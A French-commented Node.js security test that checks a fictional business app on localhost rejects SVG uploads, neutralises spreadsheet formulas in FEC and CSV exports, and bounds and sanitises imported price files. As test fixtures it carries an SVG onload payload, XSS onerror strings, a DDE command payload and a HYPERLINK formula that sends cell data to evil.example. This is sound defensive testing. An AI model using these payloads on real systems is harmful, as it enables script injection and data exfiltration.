// GARDE de l'audit de sécurité (étape 7 sur 8, 17 novembre 2026) : S04 (un SVG n'est pas un papier de véhicule), S06 (les exports ne produisent pas de
// formule de tableur), S07 et S11 (l'import d'un fichier de prix est borné, nettoyé, l'unité est une liste de ce qui est permis).
// Chaque contrôle compte sa population (le fichier a vraiment été pris, l'export vraiment produit) et a son témoin (un PNG et un PDF passent encore,
// un nom ordinaire sort tel quel de l'export : sinon la garde refuserait tout, ou ne regarderait rien).
// ⛔ 127.0.0.1 seulement, entreprise fictive. « N ✓ · M ✗ », sortie 1 si un contrôle tombe. RACINE=<copie> rejoue la sonde sur une copie mutée.
const L = require('../lib.js');
const SVG = '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60" onload="window.__pwn=1"><rect width="200" height="60" fill="#ccc"/></svg>';
const FORMULE = '=HYPERLINK("https://evil.example/?d="&A2;"Voir la facture")';
// un PNG de 1 pixel
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64');
(async () => {
  const c = await L.ouvrir({ profil: 'mac', qui: 'marc', attente: 1400 }), p = c.p;
  p.on('dialog', d => d.accept().catch(() => {}));
  const att = ms => p.waitForTimeout(ms);
  // ═══ S04 : les papiers d'un véhicule ═══
  const ajouter = async (cle, fichier) => {
    await p.evaluate(() => { try { fermerPanneau(); } catch (e) {} vehFiche('veh1', 'papiers'); }); await att(700);
    const a = p.locator('[data-vh="docadd|veh1"]').first(); if (!(await a.count())) return { bouton: false };
    await a.click(); await att(450);
    await p.locator('#vh-dk').selectOption(cle).catch(() => {}); await p.locator('#vh-df').setInputFiles(fichier); await att(250);
    await p.locator('[data-vh="docok|veh1"]').first().click(); await att(800);
    return { bouton: true, doc: await p.evaluate(k => { const d = (VEHICULES[0].docs || {})[k]; return d ? { type: d.type, nom: d.nom } : null; }, cle), toast: await p.evaluate(() => (document.getElementById('toast') || {}).textContent || '') };
  };
  const svg = await ajouter('assur', { name: 'attestation.svg', mimeType: 'image/svg+xml', buffer: Buffer.from(SVG) });
  L.v('S04 (population) le formulaire « Ajouter un document » existe et a pris le fichier .svg', svg.bouton);
  L.v('S04 un SVG n\'est pas rangé comme attestation d\'assurance', !svg.doc, svg);
  L.v('S04 le refus dit pourquoi (une photo ou un PDF suffit)', /photo|PDF/i.test(svg.toast), svg.toast.slice(0, 120));
  const png = await ajouter('carte', { name: 'carte-grise.png', mimeType: 'image/png', buffer: PNG });
  L.v('S04 témoin : un PNG est rangé comme carte grise', !!png.doc && png.doc.type === 'image/png', png);
  const pdf = await ajouter('ct', { name: 'controle.pdf', mimeType: 'application/pdf', buffer: Buffer.from('%PDF-1.4\n1 0 obj<<>>endobj\ntrailer<<>>\n%%EOF') });
  L.v('S04 témoin : un PDF est rangé comme procès-verbal de contrôle', !!pdf.doc && pdf.doc.type === 'application/pdf', pdf);
  // un papier déjà rangé AVANT la règle (donnée d'avant) : sa miniature ne devient pas un lien vers un document exécutable
  await p.evaluate(() => { VEHICULES[0].docs.assur = { nom: 'ancien.svg', type: 'image/svg+xml', url: 'blob:http://127.0.0.1/ancien', d: AUJ }; try { fermerPanneau(); } catch (e) {} vehFiche('veh1', 'papiers'); }); await att(800);
  const lien = await p.evaluate(() => [...document.querySelectorAll('a.vx-mini')].map(a => a.getAttribute('aria-label') + '|' + (a.getAttribute('href') || '').slice(0, 20)));
  L.v('S04 une miniature SVG déjà rangée n\'est plus un lien blob: (liens présents : ' + lien.length + ')', !lien.some(x => /Attestation/i.test(x) && /blob:/.test(x)), lien);
  L.v('S04 (population) le PNG et le PDF rangés ont, eux, leur miniature (' + lien.length + ' lien(s))', lien.length >= 1, lien);

  // ═══ S06 : les exports ═══
  await p.evaluate(() => { window.__dl = []; window.telechargerFichier = async (nom, data) => { window.__dl.push({ nom: String(nom), texte: typeof data === 'string' ? data : null }); return 'enregistre'; }; });
  const fec = await p.evaluate(F => { const k = Object.keys(CLIENTS)[0], av = CLIENTS[k].nom; CLIENTS[k].nom = F; const f = FACTURES.find(o => o.num !== '—' && o.st !== 'brouillon' && o.cli === k) || FACTURES.find(o => o.num !== '—' && o.st !== 'brouillon'); const c0 = f.cli; f.cli = k;
    let t; try { t = cpFec(); } catch (e) { t = 'ERREUR ' + e.message; } f.cli = c0; CLIENTS[k].nom = av; if (/^ERREUR/.test(t)) return { erreur: t, lignes: 0, cellules: [] };
    const cell = t.split('\r\n').flatMap(l => l.split('\t')).filter(x => x.includes('HYPERLINK')); return { lignes: t.split('\r\n').length, cellules: cell.slice(0, 3) }; }, FORMULE);
  L.v('S06 (population) le FEC du mois a des écritures (' + fec.lignes + ' lignes) et reprend le nom piégé (' + fec.cellules.length + ' cellule(s))', fec.lignes > 5 && fec.cellules.length >= 1, fec);
  L.v('S06 FEC : aucune cellule ne commence par = + - @ (formule chez le comptable)', fec.cellules.every(x => !/^[=+@\t\r-]/.test(x)), fec.cellules.map(x => x.slice(0, 40)));
  const veh = await p.evaluate(async F => { const v = VEHICULES[0], ancien = v.plaque; window.__dl = []; v.plaque = F; try { vhCsvFlotte(); } catch (e) {} try { v.frais = v.frais || []; v.frais.push([AUJ, F, 10]); vxCsv(v.id); } catch (e) {}
    await new Promise(r => setTimeout(r, 400)); v.plaque = ancien; return { n: window.__dl.length, cellules: window.__dl.map(x => String(x.texte || '').split('\r\n').map(l => l.split(';')).flat().filter(x => x.includes('HYPERLINK')).map(x => x.slice(0, 60))).flat() }; }, FORMULE);
  L.v('S06 (population) les deux tableaux de Véhicules ont été produits (' + veh.n + ') et reprennent le nom piégé (' + veh.cellules.length + ')', veh.n >= 2 && veh.cellules.length >= 1, veh);
  L.v('S06 CSV Véhicules : aucune cellule ne commence par = + @ — ni derrière les guillemets (Excel évalue aussi "=…")', veh.cellules.every(x => !/^"?[=+@\t\r]/.test(x)), veh.cellules);
  const ordinaire = await p.evaluate(() => { const v = VEHICULES[0], ancien = v.plaque; window.__dl = []; v.plaque = 'AB-123-CD'; try { vhCsvFlotte(); } catch (e) {} v.plaque = ancien; return window.__dl.some(x => /AB-123-CD/.test(x.texte || '') && !/'AB-123-CD/.test(x.texte || '')); });
  L.v('S06 témoin : une plaque ordinaire sort telle quelle de l\'export (la garde ne touche pas aux valeurs saines)', ordinaire);

  // ═══ S07 + S11 : l'import d'un fichier de prix ═══
  const q = t => '"' + String(t).replace(/"/g, '""') + '"';
  const lignes = ['Désignation;Référence;EAN;Prix net;Unité',
    `${q('Article piégé ZQ1"\'><img src=x data-ch="i1" onerror="window.__xss=1">')};${q('REF<b>')};3000000000001;12,50;${q('u"\'><img src=x data-ch="i2" onerror="window.__xss=1">')}`,
    `${q(FORMULE)};${q("+cmd|' /C calc'!A0")};-2+3;99,00;@SUM(1+1)`,
    `Article géant ${'G'.repeat(100000)};GEANT;3000000000002;5,00;u`,
    'Prix absurde 1;P1;3000000000011;1e999;u', 'Prix absurde 2;P2;3000000000012;-5;u', 'Prix absurde 3;P3;3000000000013;NaN;u', 'Prix absurde 4;P4;3000000000014;99999999999999999999999;u',
    'Article ordinaire;ORD1;3000000000021;12,50;kg'];
  const imp = await p.evaluate(texte => { try { fermerPanneau(); } catch (e) {} const f = MES_FOURN[0]; foAnalyser(texte, f, 'garde.csv'); const L = FO_IMP ? foLignes() : null; return L ? { n: L.length, lignes: L.map(o => ({ nom: o.nom.slice(0, 40), longueur: o.nom.length, ref: o.ref, u: o.u, pa: o.pa })) } : { refuse: true }; }, lignes.join('\n'));
  L.v('S11 (population) le fichier de prix piégé est lu et produit des lignes (' + (imp.n || 0) + ')', imp.n >= 3, imp);
  const nom = n => (imp.lignes || []).find(o => o.nom.startsWith(n));
  L.v('S11 une désignation de 100 000 signes est bornée à 200', (imp.lignes || []).every(o => o.longueur <= 200), (imp.lignes || []).map(o => o.longueur));
  L.v('S11 les prix absurdes (1e999, -5, NaN, 10²³ €) n\'entrent pas ; l\'article ordinaire, si (population : ' + (imp.lignes || []).length + ' lignes)', !(imp.lignes || []).some(o => /Prix absurde/.test(o.nom)) && !!nom('Article ordinaire'), (imp.lignes || []).map(o => o.nom + '=' + o.pa));
  L.v('S07 l\'unité piégée du fichier est refusée (vide), l\'unité « kg » passe', (nom('Article piégé') || {}).u === '' && (nom('Article ordinaire') || {}).u === 'kg', (imp.lignes || []).map(o => o.nom + '→' + o.u));
  L.v('S07/S11 aucune désignation ni référence ne commence par = + - @ ni ne porte de balise', (imp.lignes || []).every(o => !/^[=+@-]/.test(o.nom) && !/^[=+@-]/.test(o.ref) && !/[<>]/.test(o.nom + o.ref)), (imp.lignes || []).map(o => o.nom + '|' + o.ref));
  const gros = await p.evaluate(() => { try { fermerPanneau(); } catch (e) {} FO_IMP = null; const l = ['Désignation;Référence;EAN;Prix net;Unité']; for (let i = 0; i < 6000; i++) l.push('Remplissage ' + i + ';ZZ' + i + ';' + (3100000000000 + i) + ';5,00;u'); const t0 = performance.now(); foAnalyser(l.join('\n'), MES_FOURN[0], 'gros.csv'); return { importe: !!FO_IMP, ms: Math.round(performance.now() - t0), toast: (document.getElementById('toast') || {}).textContent || '' }; });
  L.v('S11 un fichier de 6 000 lignes est refusé avec un message qui dit pourquoi (pas de gel de l\'écran : ' + gros.ms + ' ms)', !gros.importe && /5 000/.test(gros.toast) && gros.ms < 2000, gros);
  const ok5 = await p.evaluate(() => { FO_IMP = null; const l = ['Désignation;Référence;EAN;Prix net;Unité']; for (let i = 0; i < 4000; i++) l.push('Remplissage ' + i + ';ZZ' + i + ';' + (3100000000000 + i) + ';5,00;u'); foAnalyser(l.join('\n'), MES_FOURN[0], 'moyen.csv'); return { importe: !!FO_IMP, n: FO_IMP ? FO_IMP.rows.length : 0 }; });
  L.v('S11 témoin : un fichier de 4 000 lignes passe encore', ok5.importe && ok5.n === 4000, ok5);
  console.log('erreurs page :', c.err.slice(0, 3));
  await L.fin(c); await L.fermer(); process.exit(L.bilan() ? 1 : 0);
})().catch(async e => { console.error(e); try { await L.fermer(); } catch (x) {} process.exit(2); });
